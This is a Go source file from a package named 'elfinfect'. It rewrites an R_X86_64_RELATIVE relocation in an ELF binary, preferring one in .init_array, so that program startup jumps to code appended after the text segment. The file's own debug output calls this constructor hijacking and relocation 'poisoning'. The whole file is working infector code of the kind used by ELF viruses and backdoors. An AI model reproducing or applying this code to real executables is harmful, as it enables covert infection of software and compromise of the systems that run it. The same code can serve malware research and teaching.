package elfinfect

import(
	"encoding/binary"
	"debug/elf"
	"reflect"
	"errors"
	"bytes"
	"fmt"
)

func (t *TargetBin) relativeRelocHook(origAddend *int64, relocEntry *elf.Rela64, debug bool) error {			
	pHeaders := t.Phdrs.([]elf.Prog64)
	textNdx := t.impNdx.textNdx

	if debug {
		fmt.Println("[+] CtorsHijack requested. Locating and reading Dynamic Segment")
		
	}
			
	if err := t.GetDyn(); err != nil {
		return err;
	}
		
	if debug {
		fmt.Printf("[+] %d entries in Dynamic Segment\n", len(t.Dyn.([]elf.Dyn64)))
	}
			
	var dtRelaOffset uint64
	var dtRelaEntryCount uint64

	for _, dynEntry := range t.Dyn.([]elf.Dyn64) {
		if elf.DynTag(dynEntry.Tag) == elf.DT_RELA {
			if debug {
				fmt.Printf("[+] Located DT_RELA @ 0x%016x\n", dynEntry.Val)
			}
			dtRelaOffset = dynEntry.Val
		}

		if elf.DynTag(dynEntry.Tag) == elf.DT_RELAENT {
			if debug {
				fmt.Printf("[+] DT_RELA has %d entries\n", dynEntry.Val)
			}
			dtRelaEntryCount = dynEntry.Val
		}
	}			

	if dtRelaEntryCount == 0 || dtRelaOffset == 0 {
		return errors.New("Error while acquiring DT_RELA or DT_RELAENT")
	}
				
	var o uint64
	
	o = dtRelaOffset
	if debug{
		fmt.Printf("[+] File offset of relocations @ 0x%016x\n", o)
	}
		
	relaEntrySize := uint64(reflect.TypeOf(*relocEntry).Size())		
	endReloc := o + dtRelaEntryCount * uint64(relaEntrySize)

	for s := relaEntrySize; o < endReloc; o += s {
		relReader := bytes.NewBuffer(t.Contents[o : o + s])
		if err := binary.Read(relReader, t.EIdent.Endianness, relocEntry); err != nil {
			return err
		}
				
		if elf.R_X86_64(relocEntry.Info) == elf.R_X86_64_RELATIVE {
			if t.hasTLS {
				if t.withInSectionVirtualAddrSpace(".init_array", relocEntry.Off) {
					break;	
				}
				continue
			}
			break
		}
	}

	if debug {
		fmt.Println("[+] Found viable relocation record hooking/poisoning")
		fmt.Printf("\toffset: 0x%016x\n", relocEntry.Off) 
		fmt.Printf("\ttype: %s\n", elf.R_X86_64(relocEntry.Info).String())
		fmt.Printf("\tAddend: 0x%016x\n", relocEntry.Addend)
	}

	if elf.R_X86_64(relocEntry.Info) != elf.R_X86_64_RELATIVE {
		return errors.New("No R_X86_64_RELATIVE relocation type present for this technique.")
	}
			
	*origAddend = relocEntry.Addend
	relocEntry.Addend = int64(pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz) 
	
	relWriter := new(bytes.Buffer)
	if err := binary.Write(relWriter, t.EIdent.Endianness, relocEntry); err != nil {
		return err
	}
	
	copy(t.Contents[o:], relWriter.Bytes())

	var fileOff uint64
	if err := getFileOffset(relocEntry.Off, pHeaders, &fileOff); err != nil {
		fmt.Println(err)

	}
	
	binary.LittleEndian.PutUint64(t.Contents[fileOff:], uint64(relocEntry.Addend))

	if debug {
		fmt.Printf("[+] offset 0x%016x updated with value (Addend) %016x\n", fileOff, relocEntry.Addend)
	}
	
	return nil
}

func (t *TargetBin) withInSectionVirtualAddrSpace(sectionName string, addr interface{}) bool {
	var s int
	for s = 0; s < len(t.SectionNames); s++ {
		if sectionName == t.SectionNames[s] {
			break
		}
	}
	
	var status bool
	if shdrs, ok := t.Shdrs.([]elf.Section64); ok {
		startAddr := shdrs[s].Addr
		endAddr := shdrs[s].Addr + shdrs[s].Size 
		status =  addr.(uint64) >= startAddr && addr.(uint64) <= endAddr 
	}

	return status
}
